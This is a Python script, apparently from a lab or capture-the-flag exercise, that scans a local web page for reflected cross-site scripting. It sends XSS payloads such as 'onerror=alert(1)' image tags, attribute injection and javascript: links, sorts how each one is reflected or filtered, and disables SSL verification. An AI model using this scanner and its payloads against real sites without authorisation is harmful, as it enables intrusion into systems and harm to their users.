import urllib.request
import urllib.parse
import urllib.error
import ssl
import html
import re
import sys

class XSSContextAnalyzer:
    def __init__(self, base_url, timeout=15):
        self.base_url = base_url
        self.timeout = timeout
        self.results = []
        
        # Disable SSL verification for testing
        ssl._create_default_https_context = ssl._create_unverified_context
    
    def test_payload(self, test_name, payload):
        """
        Test a single payload and analyze its reflection context
        Returns: dict with test results
        """
        try:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload, safe='')
            url = f"{self.base_url}?name={encoded_payload}"
            
            print(f"\n{'='*70}")
            print(f"Testing PAYLOAD: {payload}")
            print(f"Test Name: {test_name}")
            print(f"Request URL: {url[:100]}...")
            
            # Make HTTP request
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                response_data = response.read().decode('utf-8', errors='ignore')
                status_code = response.getcode()
            
            # Analyze reflection
            if payload in response_data:
                reflection_found = "Yes"
                context = self.extract_context(payload, response_data, is_raw=True)
                encoding = "none"
                filter_type = self.detect_filter(payload, response_data, "none")
                snippet = self.get_snippet(payload, response_data)
            else:
                # Check for HTML encoded version
                html_encoded = html.escape(payload)
                if html_encoded in response_data:
                    reflection_found = "Yes"
                    context = self.extract_context(html_encoded, response_data, is_raw=False)
                    encoding = "HTML entities decoded"
                    filter_type = "HTML_ENCODING_APPLIED"
                    snippet = self.get_snippet(html_encoded, response_data)
                else:
                    # Check for partially encoded (common pattern)
                    partial_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
                    if partial_encoded in response_data:
                        reflection_found = "Yes"
                        context = self.extract_context(partial_encoded, response_data, is_raw=False)
                        encoding = "Partial HTML encoding (&lt; &gt;)"
                        filter_type = "PARTIAL_ENCODING"
                        snippet = self.get_snippet(partial_encoded, response_data)
                    else:
                        reflection_found = "No"
                        context = "N/A"
                        encoding = "N/A"
                        filter_type = "BLOCKED"
                        snippet = response_data[:200] if response_data else "Empty response"
            
            # Format output as requested
            print(f"Response contains payload: {reflection_found}")
            print(f"Reflection context: {context}")
            print(f"Filter detected: {filter_type}")
            print(f"HTML encoding: {encoding}")
            print(f"Response snippet:\n{snippet}")
            
            # Store result
            result = {
                'test_name': test_name,
                'payload': payload,
                'status_code': status_code,
                'reflection_found': reflection_found,
                'context': context,
                'filter': filter_type,
                'encoding': encoding,
                'snippet': snippet
            }
            
            self.results.append(result)
            return result
            
        except Exception as e:
            print(f"ERROR testing payload: {e}")
            error_result = {
                'test_name': test_name,
                'payload': payload,
                'status_code': 0,
                'reflection_found': 'ERROR',
                'context': 'N/A',
                'filter': str(e),
                'encoding': 'N/A',
                'snippet': 'N/A'
            }
            self.results.append(error_result)
            return error_result
    
    def extract_context(self, needle, haystack, is_raw):
        """Determine where the payload is reflected in HTML"""
        if not haystack or needle not in haystack:
            return "NOT_FOUND"
        
        idx = haystack.index(needle)
        
        # Look backwards to find context
        before = haystack[max(0, idx-200):idx]
        after = haystack[idx:idx+len(needle)+200]
        
        # Check for script context
        if "<script" in before or "</script>" in after:
            if is_raw:
                return "INSIDE_SCRIPT_TAG (raw javascript)"
            else:
                return "INSIDE_SCRIPT_TAG (HTML encoded)"
        
        # Check for attribute context
        attr_patterns = ['href=', 'src=', 'action=', 'onload=', 'onerror=', 'onclick=', 'onmouseover=', 'onmouseout=', 'onfocus=', 'onblur=']
        for attr in attr_patterns:
            if attr in before:
                return f"INSIDE_ATTRIBUTE ({attr})"
        
        # Check if inside tag but not attribute
        if "<" in before and ">" in after and "=" not in before.split("<")[-1]:
            return "INSIDE_HTML_TAG"
        
        # Default to text content
        return "TEXT_CONTENT"
    
    def detect_filter(self, original_payload, response, encoding):
        """Detect what type of filtering is applied"""
        if encoding == "none" and original_payload in response:
            # Check for specific keyword filtering
            if "script" in original_payload.lower() and "script" not in response.lower():
                return "BLOCKED - script keywords removed"
            elif "onerror" in original_payload.lower() and "onerror" not in response.lower():
                return "BLOCKED - event handlers removed"
            elif "javascript:" in original_payload.lower() and "javascript:" not in response.lower():
                return "BLOCKED - javascript protocol removed"
            elif "<" in original_payload and ">" in original_payload and "<" not in response:
                return "BLOCKED - HTML tags removed"
            else:
                return "none"
        elif encoding == "HTML_ENCODING_APPLIED":
            return "partial - HTML entities encoded"
        else:
            return "BLOCKED - payload removed"
    
    def get_snippet(self, needle, haystack):
        """Extract relevant snippet from response"""
        if needle not in haystack:
            return "Payload not found in response"
        
        idx = haystack.index(needle)
        start = max(0, idx - 100)
        end = min(len(haystack), idx + len(needle) + 100)
        
        snippet = haystack[start:end]
        return snippet
    
    def print_summary(self):
        """Print summary table"""
        print("\n" + "="*80)
        print("XSS CONTEXT ANALYSIS - SUMMARY")
        print("="*80)
        print(f"{'Test Name':<25} {'Status':<15} {'Context':<25} {'Filter':<15}")
        print("-"*80)
        
        for r in self.results:
            status = r['reflection_found']
            print(f"{r['test_name']:<25} {status:<15} {r['context']:<25} {r['filter']:<15}")
        
        print("\n" + "="*80)

def main():
    """Main execution function"""
    analyzer = XSSContextAnalyzer("http://127.0.0.1:33081/page")
    
    print("XSS CONTEXT ANALYSIS")
    print("Target: http://127.0.0.1:33081/page?name=PAYLOAD")
    print("="*80)
    
    # Test all required payload categories
    test_cases = [
        ("Plain Text", "HelloTest"),
        ("HTML Tag - Bold", "<b>BOLD</b>"),
        ("HTML Tag - Italic", "<i>ITALIC</i>"),
        ("Script Tag", "<script>test</script>"),
        ("Event Handler", '<img src=x onerror=alert(1)>'),
        ("Attribute Injection", '" onload=alert(1)>'),
        ("JavaScript URL", '<a href="javascript:alert(1)">click</a>'),
        ("Special Characters", "<>\"'&"),
        ("Mixed XSS", '<img src=x onError=alert(\'XSS\')>')
    ]
    
    # Run tests
    for test_name, payload in test_cases:
        try:
            analyzer.test_payload(test_name, payload)
        except KeyboardInterrupt:
            print("\nTest interrupted by user")
            break
        except Exception as e:
            print(f"Fatal error in test {test_name}: {e}")
    
    # Print summary
    analyzer.print_summary()
    
    # Final analysis
    print("\nKEY FINDINGS:")
    raw_reflected = [r for r in analyzer.results if r['reflection_found'] == 'Yes' and r['encoding'] == 'none']
    encoded_reflected = [r for r in analyzer.results if r['reflection_found'] == 'Yes' and r['encoding'] != 'none']
    blocked = [r for r in analyzer.results if r['reflection_found'] == 'No']
    
    print(f"✓ Payloads reflected without encoding: {len(raw_reflected)}")
    print(f"✓ Payloads reflected with encoding: {len(encoded_reflected)}")
    print(f"✗ Payloads blocked/filtered: {len(blocked)}")
    
    # List vulnerable contexts
    if raw_reflected:
        print("\nPOTENTIALLY VULNERABLE CONTEXTS (raw reflection):")
        for r in raw_reflected:
            print(f"  - {r['test_name']}: {r['context']}")
    
    return analyzer.results

if __name__ == "__main__":
    results = main()
    print("\nAnalysis complete. Review test results above for detailed findings.")
